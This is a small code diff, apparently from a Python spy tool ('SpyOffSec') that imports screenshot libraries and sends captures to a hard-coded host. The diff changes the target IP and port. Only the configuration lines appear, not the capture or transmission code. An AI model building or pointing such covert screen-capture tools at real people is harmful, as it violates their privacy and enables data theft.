@@ -19,8 +19,8 @@ else:
     import pyscreenshot as ImageGrab
     from PIL import Image
 
-ip = '192.168.1.62'
-port = 666
+ip = '192.168.1.1'
+port = 445
 
 class SpyOffSec():
     def __init__(self, ip, port, img_name='temp.jpg'):
